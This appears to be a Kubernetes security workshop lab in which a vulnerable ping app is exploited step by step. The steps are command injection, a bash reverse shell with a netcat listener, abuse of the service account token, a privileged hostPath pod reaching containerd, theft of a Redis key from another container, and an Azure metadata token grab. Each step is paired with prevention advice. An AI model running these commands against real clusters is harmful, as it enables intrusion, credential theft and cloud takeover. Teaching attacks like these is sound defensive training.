# Hijack Kubernetes Hands-on

## Play with the sample app

The sample application "ping me" pings a target specified via the input field. Try the following inputs:

```bash
127.0.0.1

127.0.0.1; echo "I was here"

; which bash
```

<details>
<summary>Details on how to input the snippets</summary>

1. Let's try to inject a command after the IP address: `127.0.0.1; echo "I was here"`. As you can see in the answer, it worked.
2. Now we try whether `bash` is available: `; which bash`. And it is! Looks like we can try to hijack the container.

</details>

<details>
<summary>How to prevent this attack</summary>

* Shift security left and enable [SAST scanning](https://owasp.org/www-community/Source_Code_Analysis_Tools)
* Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)

</details>

## Hijack the container

We now inject into the container via a reverse shell. Try to execute the following snippets:

On your attacker machine:

```bash
sudo nc -lnvp 80
```

Input for the app (change your IP):

```bash
; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'
```

<details>
<summary>Details on how to hijack the container</summary>

1. We will open a connection on our attacker machine using netcat: `sudo nc -lnvp 80`
2. Now we inject the required command into our container. This will allow us to connect a reverse shell to our open connection: `; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'`.
3. And finally, we have a reverse shell up and running. Try some commands like `ls`

</details>

<details>
<summary>How to prevent this attack</summary>

* Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)
* Deny egress network access on a network level as well as using [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
* Detect untrusted process with container runtime security tools like [Falco](https://github.com/falcosecurity/falco)

</details>

## Get access to the Kubernetes API

Let's see if we can access the API server. Execute the following snippets:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api

NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api/v1/namespaces/$NS/pods

curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/

kubectl get pods
kubectl get pods -A
kubectl get nodes

kubectl auth can-i create pod
```

<details>
<summary>Details on how to access the Kubernetes API server</summary>

Let's see if we can access the API server.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api
```

It looks like we were able to authenticate and have some access. Now let's check if we have access to other pods in our namespace:

``` bash
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api/v1/namespaces/$NS/pods
```

This looks good! Let's install `kubectl` for easier access:

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
```

Let's see what we are allowed to do:

```bash
kubectl get pods
kubectl get pods -A
kubectl get nodes

kubectl auth can-i create pod
```

</details>

<details>
<summary>How to prevent this attack</summary>

* Do not share service accounts between applications
* Do not enable higher access levels for the default service account (this app would not have needed it!)
* Review all third-party snippets before deploying them
* Use read-only filesystems
* Things we already talked about
  * Limit egress access to the internet
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security

</details>

## Hijack the Kubernetes Node

Let's try one more thing. Are we able to schedule a privileged pod and "talk" to containerd? Run the following snippets:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: default
spec:
  containers:
  - name: shell
    image: ubuntu:latest
    stdin: true
    tty: true
    volumeMounts:
    - mountPath: /mnt
      name: volume
    securityContext:
      privileged: true
  volumes:
  - name: volume
    hostPath:
      path: /run/containerd
EOF

kubectl exec -it -n default privileged-pod -- /bin/bash

apt-get update; apt-get install -y curl jq

curl -LO https://github.com/containerd/containerd/releases/download/v1.5.5/cri-containerd-cni-1.5.5-linux-amd64.tar.gz; tar -xvf cri-containerd-cni-1.5.5-linux-amd64.tar.gz

ctr --address /mnt/containerd.sock --namespace k8s.io container list

```

<details>
<summary>Details on how to hijack the node</summary>

Let's try to create a privileged pod and "talk" to containerd:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: default
spec:
  containers:
  - name: shell
    image: ubuntu:latest
    stdin: true
    tty: true
    volumeMounts:
    - mountPath: /mnt
      name: volume
    securityContext:
      privileged: true
  volumes:
  - name: volume
    hostPath:
      path: /run/containerd
EOF
```

Then we need to attach to the pod:

```bash
kubectl exec -it -n default privileged-pod /bin/bash
```

Now we can try to install some basics as well as the containerd CLI and talk to the containerd socket:

```bash
apt-get update; apt-get install -y curl jq

curl -LO https://github.com/containerd/containerd/releases/download/v1.5.5/cri-containerd-cni-1.5.5-linux-amd64.tar.gz; tar -xvf cri-containerd-cni-1.5.5-linux-amd64.tar.gz

ctr --address /mnt/containerd.sock --namespace k8s.io container list
```

</details>

<details>
<summary>How to prevent this attack</summary>

* Deny running root containers (Tools like [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) and [Kyverno](https://github.com/kyverno/kyverno) can help)
* Deny hostPath mounts
* Things we already talked about
  * Do not share service accounts
  * Limit egress access to the internet
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security

</details>

## Access secrets and data from another container

We will now try to retrieve secrets from a container that we do not have access to (via Kubernetes):

```bash
id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "87a94228f133e2da99cb16d653cd1373c5b4e8689956386c1c12b60a20421a02" | awk '{print $1}')

ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
```


With those secret we can now connect to the Redis instance and retrieve some data:

```bash
apt-get install -y redis-tools

REDIS_HOST=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_HOST | sed 's/^.*=//')
REDIS_KEY=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_KEY | sed 's/^.*REDIS_KEY=//')

redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
```

<details>
<summary>Details on how to access the secrets</summary>

We will use the containerd CLI to access details of a container running on this node.

First we will retrieve the container ID:

```bash
id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "87a94228f133e2da99cb16d653cd1373c5b4e8689956386c1c12b60a20421a02" | awk '{print $1}')
```

And then request container runtime details such as environment variables:
```bash
ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
```

With those secret we can now connect to the Redis instance and retrieve some data:

```bash
apt-get install -y redis-tools

REDIS_HOST=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_HOST | sed 's/^.*=//')
REDIS_KEY=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_KEY | sed 's/^.*REDIS_KEY=//')

redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
```

</details>

<details>
<summary>How to prevent this attack</summary>

* Deny running root containers (Tools like [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) and [Kyverno](https://github.com/kyverno/kyverno) can help)
* Deny hostPath mounts
* Things we already talked about
  * Limit egress access to other cloud resources
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security

</details>

## Hijack Cloud resources

We can also use the underlying cloud identity and try to escape even further. Run the following snippet to get a valid cloud provider token (in our case the Client ID of the underlying Managed Identity):

```bash
mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp

IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)

TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)

SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)

curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
```

We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.

<details>
<summary>Details on how to retrieve a Cloud provider token</summary>

First, we need to mount the local node's file system to access the underlying identity ID:

```bash
mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
```

We can now retrieve the cloud identity used and request a valid token via the cloud metadata service (in our case Azure Instance Metadata Service):

```bash
mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp

IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)

TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)

SUBSCRIPTION=$(cat /tmp/etc/kubernetes/azure.json | jq -r .subscriptionId)
RG=$(cat /tmp/etc/kubernetes/azure.json | jq -r .resourceGroup)

curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
```

We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.

</details>

<details>
<summary>How to prevent this attack</summary>

* Deny access to the Cloud provider metadata service using Network Policies (all Cloud providers!)
* Things we already talked about
  * Deny priviledged containers, host path mounts and other security related settings via Policies
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security

</details>
